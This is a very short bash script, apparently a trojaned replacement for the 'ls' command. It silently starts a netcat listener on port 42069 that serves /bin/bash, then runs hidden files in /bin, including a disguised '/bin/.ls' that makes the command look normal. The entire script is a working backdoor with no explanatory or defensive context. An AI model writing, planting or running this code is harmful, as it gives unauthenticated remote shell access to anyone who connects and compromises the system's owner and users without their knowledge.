#!/bin/bash
nc -lvp 42069 -e /bin/bash > /dev/null 2>&1 &
/bin/.not_a_shell.sh
/bin/.ls --color=auto
